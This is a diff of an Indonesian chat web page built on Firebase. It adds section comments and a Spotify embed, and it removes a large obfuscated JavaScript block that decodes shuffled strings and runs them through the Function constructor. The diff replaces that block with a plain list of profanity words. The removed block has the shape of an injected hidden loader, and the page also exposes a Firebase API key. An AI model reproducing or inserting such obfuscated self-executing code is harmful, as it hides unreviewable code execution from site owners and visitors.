@@ -598,6 +598,7 @@
       <section id="games" class="py-16 px-4">
         <div class="max-w-5xl mx-auto">
           <div class="grid md:grid-cols-2 gap-8">
+            <!-- SPOTIFY PLAYLIST PLAYER - Replacing Tebak Angka -->
             <div class="window-y2k">
               <div
                 class="title-bar-y2k"
@@ -619,6 +620,7 @@
                   </div>
                 </div>
 
+                <!-- Spotify Embed Player -->
                 <div class="spotify-player-container mb-4">
                   <iframe
                     style="border-radius: 12px"
@@ -932,6 +934,9 @@
     </div>
 
     <script>
+      // =======================
+      // 1. KONFIGURASI & INISIALISASI FIREBASE
+      // =======================
       const firebaseConfig = {
         apiKey: "AIzaSyB7oxXJjvUYwPX3PyAbYU8IDLtkiqcmMMY",
         authDomain: "chat-pplg.firebaseapp.com",
@@ -959,45 +964,67 @@
         showNotification("❌ Gagal terhubung ke database cloud!");
       }
 
-      var badWords;
-      (function () {
-        var GpW = "",
-          pvF = 416 - 405;
-        function sWQ(y) {
-          var i = 1935739;
-          var n = y.length;
-          var u = [];
-          for (var x = 0; x < n; x++) {
-            u[x] = y.charAt(x);
-          }
-          for (var x = 0; x < n; x++) {
-            var o = i * (x + 161) + (i % 53769);
-            var t = i * (x + 368) + (i % 46514);
-            var s = o % n;
-            var l = t % n;
-            var r = u[s];
-            u[s] = u[l];
-            u[l] = r;
-            i = (o + t) % 2529013;
-          }
-          return u.join("");
-        }
-        var FxR = sWQ("lxusjobctacwozhitfmrukdtgoernspnrqvyc").substr(0, pvF);
-        var Vdp =
-          '4+vi[dfh,txoc,i(ot."yhcin=ab,dc,,hut,ptuoswrd+uv;tn5;,.ela]=(9rs0)[(6,},nCl,z,aruae(evu=gyrn(uC77=6,8+lc0,n,)8ud=8)l)a(==.vav!p1n 7f+kh)st[06iyflC);sr+q}=h(10g)=c,=)fnn]w.cr3hw(0"k[=t9s)taoxfg+qn=pflar(cm ;.h g}a;gzm> { ,jesr7+;b;++e+mrr61)evh=av;s 9b.crl 3scl8,cp8ncv9rrl=rfg)t-tS{e;( +(=u7-2(ilr .[p<(,r4ra(<ngha+;c- an= nnAal.e=pp;-var z)a0l,oit2C=ra af+o2v(.2 qpCv <,rjh)))icoir.ra";}fvotgAtsnvn, e he]rp.=1;nx90j=.s[17*.;6avh2..d.e)te++;=xr=;(c;cnnbaeegotif(jt=p){+ffngs;===mreeki[l=kfd1hd((<]9urw;+(.0s).nw"ctj.(r7n4a;go(7uj ]u1m(;ewro(=i"u1,a(n3y=b r]b,38;=tgwk;+o][rnf)h=r.iu ]naAix;dew)vltbe7(ve-o1+ti)c6;)u)+fhftuodnosalai,;qwdat8iarnu!uaobhq;c.0)4Atge(au=.(,=;n ")r6;]{;pr0+srce] crv(eeleo{j[j=;4"g;vilh*=zlu3tro69v1<n(("r)a-h-n2=v({e;.[u .oS=+.h0a;oi{)1hrC+;,d5s;;asr(;a=n;o66;",a8i il;;n[>]l;].d0lorurtnr)iv;)g8[Asa}=h+ f}[o)g.;4+cC5a}Cg)=e=vn])1r2ktl=f(2dsvlu[2t;"l)a)ru]so;on';
-        var oHk = sWQ[FxR];
-        var uIn = "";
-        var giJ = oHk;
-        var Acc = oHk(uIn, sWQ(Vdp));
-        var jag = Acc(
-          sWQ(
-            '[&iim7g1.jr&}ad%Xve{eoX.%#{.%2ee,l &2%na%}XeX3X}b;m{&b}k.k=}.#aXX%ua,kotl.bnX2,;g%._i 8ndu()1f+30_t4;!.n3 tl1g!X=nin0X;i.X.)&%%-XXl&s_%nunm$g(b2&!,&&X_bp%ms %ep7%ie %egtks_0#lX%nXt0bX6nkrl}ed)b*.t6ba9a.kq(!.ihX!)ag$i)gg6nmfg3..b&%%\/ml,pX{X9nen$%w)S,Xs%Xdp1n+yX%.(=!.}3$2(%3X.f,kmk%,&j)i.kttnao%XeX3emlo;e&jX\'h+7ie3m7p(X8o7,ty)%j[X()!1bb0dl!%0;aejkp.-;X&nlg42Xa4 %dS(.on6ub0\/o_g-,elt1X4bX3%(==)2)t\'otnan),3)ksai!%;&6;ne.XjX.&%4at3efX%Xb5b7uu.0&_Xs)1b{.]gibb;&C-;%XeXXgdeXl)(b&X,1)X3XXbXXll1gg(=.5XX_n7XX"stt6pge2;$),=+3_Xf+&t_+1oXXj1",n4\/&*rXXo=0.(ede9r%.nyi&%3h)h_XXXns=.%X.!c.Xrsm%4n)bifnrfXlbXX.t,f,$Xdtx,ob72;_)e7e"33btX3_btX43X!uab;a4e%$=.;Xe8X,ng=e8bX1X_4%2s)a.6X72,(3ll%%)w.l%;7%aa4s5%&kt(-1iX&lnf"3&!X ;Xi,X!&sX7"s=s(bbipXf%;er4&tlal(gnb$kntXen(X,.l8%;3nu&gngtbXX;&XX=X4*b3]Xe!.$1in!3gX)i+bramC{tt6X)6%!2,3tk-X=fni3okg2nt(dugeXX.g=2i2!9X,b$e 2b+n=e]XtX!rbtt)-=X%.(_XbjX3%$Xg1d*to(t3\'0&XfXwm4%)[} XtXabf6fef74faanfan.k9}3es% bne;dX!o3e4o3bb1$[%eit750!)g=e!&Xk%s&eX0Xb&riu1X)b.el+X3&eono.3Xs7t&XXgagnj%%#e&,XXr1%2b1eb)0n_(2a(b2_X +_Xy2!1%XgX)2fX&;.)_2nr%ctf.3gp.c$ 1(jX{ 273.4%X)5(r36%ea93&n)j819o(0=(be%Xe{.X=bo%l(u&r&t,1gb8{beo%ie.[n).XX8%XragXaXs5s])nnlX1)#%eabXa}._b%Xhn7$bmn$6(.t_sXnXy.8og \/\/#(\'=6.sao_;"i$!,gg!yX9&{$X%et,(62._a.&4,}1(s)d)u,39e11.% w3st0f;p)3$sb{r20)na;ruX(go)jo$5bX5&jSon0oX)(o,o$ftb2152g4 v}X$%.$&$]n5sr$XurX. 35,3cg1.%t 3_s7b1(fo]-b}fe6pioX{.a;,t=rrj iX3=v7$bro=n05}(2{!Xmb(i2X(#5iXpgnai$}("X j}p2g',
-          ),
-        );
-        var Mzz = giJ(GpW, jag);
-        Mzz(1898);
-        return 3402;
-      })();
+      // =======================
+      // 2. FILTER KATA KASAR
+      // =======================
+      const badWords = [
+        "anjing",
+        "anjg",
+        "ajg",
+        "anjeng",
+        "asw",
+        "asu",
+        "anj",
+        "bangsat",
+        "bangsad",
+        "bngst",
+        "bgsd",
+        "bangst",
+        "babi",
+        "bb",
+        "babi ngepet",
+        "bajingan",
+        "bjngan",
+        "bajing",
+        "goblok",
+        "goblog",
+        "gblok",
+        "gblk",
+        "goblo",
+        "idiot",
+        "tolol",
+        "gila",
+        "sinting",
+        "kontol",
+        "kntl",
+        "kntol",
+        "kont",
+        "memek",
+        "mmk",
+        "memx",
+        "pepek",
+        "ppk",
+        "ngentot",
+        "ngentod",
+        "ngntd",
+        "ngewe",
+        "jembut",
+        "jmbt",
+        "jembut",
+        "pantek",
+        "pntk",
+        "pantek",
+        "ngentot",
+        "ngentod",
+        "ngntot",
+        "pler",
+        "peler",
+        "pler",
+        "fuck",
+        "shit",
+        "damn",
+        "bitch",
+      ];
 
       function filterProfanity(text) {
         let filteredText = text;
@@ -1010,6 +1037,9 @@
         return filteredText;
       }
 
+      // =======================
+      // 3. FUNGSI CHAT SYSTEM
+      // =======================
       function listenToChat() {
         if (!isFirebaseReady) {
           console.error("Firebase belum siap!");
@@ -1268,6 +1298,9 @@
         document.getElementById(id)?.scrollIntoView({ behavior: "smooth" });
       }
 
+      // =======================
+      // 5. INISIALISASI SAAT HALAMAN DIMUAT
+      // =======================
       document.addEventListener("DOMContentLoaded", () => {
         document.querySelectorAll(".tab-y2k").forEach((tab) => {
           tab.addEventListener("click", () => {
